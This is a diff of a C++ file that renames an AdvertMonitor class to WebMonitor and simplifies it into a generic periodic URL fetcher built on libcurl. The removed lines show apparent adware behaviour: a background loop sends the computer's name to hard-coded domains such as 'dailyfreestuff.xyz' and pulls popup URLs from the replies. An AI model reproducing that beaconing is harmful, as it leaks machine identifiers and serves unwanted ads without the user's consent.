@@ -3,25 +3,19 @@
 //
 
 #include "pch.h"
-#include "AdvertMonitor.h"
-#include "Defines.h"
-#include "HelpDialog.h"
+#include "Log.h"
+#include "WebMonitor.h"
 
-AdvertMonitor::AdvertMonitor(HWND parent, std::wstring pcName)
+WebMonitor::WebMonitor(const std::string& url)
 	: isRunning_(false)
-	, parent_(parent)
-	, url_(L"")
-	, pcName_(pcName)
+	, url_(url)
 	, curlPtr_(
 		InitCurl(),
-		std::bind(&AdvertMonitor::CurlDeleter, this, std::placeholders::_1))
+		std::bind(&WebMonitor::CurlDeleter, this, std::placeholders::_1))
 {
-	domainsList_.push_back("1clickregistryfix.com/api/v1/computers/config?name=");
-	domainsList_.push_back("dailyfreestuff.xyz/api/v1/computers/config?name=");
-	domainsList_.push_back("demo-jjm.avantize.org/api/v1/computers/config?name=");
 }
 
-AdvertMonitor::~AdvertMonitor(void)
+WebMonitor::~WebMonitor(void)
 {
 	try
 	{
@@ -33,27 +27,22 @@ AdvertMonitor::~AdvertMonitor(void)
 	}
 }
 
-void AdvertMonitor::CurlDeleter(CURL* curlPtr)
+void WebMonitor::CurlDeleter(CURL* curlPtr)
 {
 	curl_easy_cleanup(curlPtr);
 	curl_global_cleanup();
 }
 
-void AdvertMonitor::DoRun()
+void WebMonitor::DoRun()
 {
 	while (isRunning_)
 	{
-		boost::this_thread::sleep(boost::posix_time::/*minutes*/seconds(SLEEP_TIME));
+		boost::this_thread::sleep(boost::posix_time::seconds(SLEEP_TIME));
 		
 		if (!isRunning_)
 			break;
 
-		std::string buf(pcName_.begin(), pcName_.end());
-		for (const auto& domain : domainsList_)
-		{
-			if(DownloadJson(domain + buf))
-				break;
-		}
+		Download(url_);
 	}
 }
 
@@ -71,7 +60,7 @@ namespace
 	}
 }
 
-bool AdvertMonitor::DownloadJson(const std::string& url)
+bool WebMonitor::Download(const std::string& url)
 {
 	if (!curlPtr_)
 		return false;
@@ -79,27 +68,14 @@ bool AdvertMonitor::DownloadJson(const std::string& url)
 	try
 	{
 		curl_easy_setopt(curlPtr_.get(), CURLOPT_URL, url.c_str());
-
-		// Don't wait forever, time out after 10 seconds.
 		curl_easy_setopt(curlPtr_.get(), CURLOPT_TIMEOUT, CURL_TIMEOUT);
-
-		// Follow HTTP redirects if necessary.
 		curl_easy_setopt(curlPtr_.get(), CURLOPT_FOLLOWLOCATION, 1);
 
-		// Response information.
 		int httpCode{ 0 };
-		//std::unique_ptr<std::string> httpData(new std::string());
 		std::string httpData;
 
-		// Hook up data handling function.
 		curl_easy_setopt(curlPtr_.get(), CURLOPT_WRITEFUNCTION, callback);
-
-		// Hook up data container (will be passed as the last parameter to the
-		// callback handling function).  Can be any pointer type, since it will
-		// internally be passed as a void pointer.
 		curl_easy_setopt(curlPtr_.get(), CURLOPT_WRITEDATA, &httpData);
-
-		// Run our HTTP GET command, capture the HTTP response code, and clean up.
 		curl_easy_perform(curlPtr_.get());
 		curl_easy_getinfo(curlPtr_.get(), CURLINFO_RESPONSE_CODE, &httpCode);
 
@@ -110,7 +86,7 @@ bool AdvertMonitor::DownloadJson(const std::string& url)
 				LERR_ << "Server response is empty.";
 				return false;
 			}
-
+			/*
 			std::stringstream dataStream;
 			dataStream << httpData;
 			boost::property_tree::ptree pt;
@@ -147,28 +123,24 @@ bool AdvertMonitor::DownloadJson(const std::string& url)
 				LDBG_ << "There isn't any valid URL.";
 				return false;
 			}
+			*/
 		}
 		else
 		{
-			LDBG_ << "Couldn't GET from popup URL.";
+			LDBG_ << "Couldn't GET from URL.";
 			return false;
 		}
 	}
 	catch (const std::exception&e)
 	{
-		LERR_ << "Popup monitor exception: " << e.what();
+		LERR_ << "Web monitor exception: " << e.what();
 		return false;
 	}
 
 	return true;
 }
 
-std::wstring AdvertMonitor::GetUrl() const
-{
-	return url_;
-}
-
-CURL* AdvertMonitor::InitCurl()
+CURL* WebMonitor::InitCurl()
 {
 	CURLcode result = curl_global_init(CURL_GLOBAL_DEFAULT);
 	if (result != CURLE_OK)
@@ -179,16 +151,16 @@ CURL* AdvertMonitor::InitCurl()
 	return curl_easy_init();
 }
 
-void AdvertMonitor::Run()
+void WebMonitor::Run()
 {
 	if (isRunning_)
 		return;
 
 	isRunning_ = true;
-	thread_.reset(new boost::thread(boost::bind(&AdvertMonitor::DoRun, this)));
+	thread_.reset(new boost::thread(boost::bind(&WebMonitor::DoRun, this)));
 }
 
-void AdvertMonitor::Stop()
+void WebMonitor::Stop()
 {
 	if (isRunning_)
 		isRunning_ = false;
